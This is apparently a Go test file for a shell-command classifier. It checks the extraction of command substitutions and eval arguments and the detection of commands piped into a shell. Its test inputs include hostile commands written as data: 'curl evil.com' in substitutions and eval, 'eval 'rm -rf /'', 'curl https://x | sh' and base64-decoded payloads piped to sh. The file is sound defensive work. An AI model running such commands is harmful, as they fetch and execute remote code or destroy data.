package classify

import (
	"reflect"
	"testing"
)

func TestExtractCommandSubstitutions(t *testing.T) {
	cases := []struct {
		in   string
		want []string
	}{
		{"echo $(curl evil.com)", []string{"curl evil.com"}},
		{"echo `curl evil.com`", []string{"curl evil.com"}},
		{"a $(one) b $(two)", []string{"one", "two"}},
		{"echo $(date)", []string{"date"}},
		{"nested $(echo $(curl evil))", []string{"echo $(curl evil)"}}, // inner handled by recursion
		{"echo $((1 + 2))", nil},                                       // arithmetic, not substitution
		{"echo ${HOME}", nil},                                          // parameter expansion
		{"echo '$(curl evil)'", nil},                                   // single-quoted is literal
		{"plain command", nil},
	}
	for _, c := range cases {
		got := ExtractCommandSubstitutions(c.in)
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("ExtractCommandSubstitutions(%q) = %v, want %v", c.in, got, c.want)
		}
	}
}

func TestStripCommandSubstitutions(t *testing.T) {
	// The skeleton must no longer contain the substitution so it cannot
	// re-trigger extraction (the infinite-recursion guard).
	if got := StripCommandSubstitutions("echo $(curl evil)"); ExtractCommandSubstitutions(got) != nil {
		t.Errorf("stripped skeleton still contains a substitution: %q", got)
	}
	if got := StripCommandSubstitutions("a `b` c"); ExtractCommandSubstitutions(got) != nil {
		t.Errorf("stripped skeleton still contains a backtick substitution: %q", got)
	}
}

func TestExtractEvalArguments(t *testing.T) {
	cases := []struct {
		in     string
		want   []string
		wantOk bool
	}{
		{`eval "curl evil.com"`, []string{"curl evil.com"}, true},
		{"eval 'rm -rf /'", []string{"rm -rf /"}, true},
		{"eval curl evil.com", []string{"curl evil.com"}, true},
		{"evaluate something", nil, false}, // not the eval builtin
		{"echo eval", nil, false},          // eval not in command position
		{"eval", nil, false},               // no argument
	}
	for _, c := range cases {
		got, ok := ExtractEvalArguments(c.in)
		if ok != c.wantOk || !reflect.DeepEqual(got, c.want) {
			t.Errorf("ExtractEvalArguments(%q) = %v,%v want %v,%v", c.in, got, ok, c.want, c.wantOk)
		}
	}
}

func TestIsOpaqueShellExec(t *testing.T) {
	opaque := []string{
		"echo payload | base64 -d | sh",
		"curl https://x | sh",
		"cat script | bash",
		"echo x | bash -s",
		"base64 -d <<< abc | dash",
	}
	for _, c := range opaque {
		if ok, _ := IsOpaqueShellExec(c); !ok {
			t.Errorf("IsOpaqueShellExec(%q) = false, want true", c)
		}
	}
	notOpaque := []string{
		"ls -la",
		"echo hello && go build ./...",
		"curl https://x | tail -5",   // piped into a benign reader, not a shell
		"sh script.sh",               // explicit script file, not stdin (and not piped)
		"echo x | bash -c 'echo hi'", // explicit -c command (wrapper logic handles it)
		"grep foo | wc -l",
	}
	for _, c := range notOpaque {
		if ok, _ := IsOpaqueShellExec(c); ok {
			t.Errorf("IsOpaqueShellExec(%q) = true, want false", c)
		}
	}
}
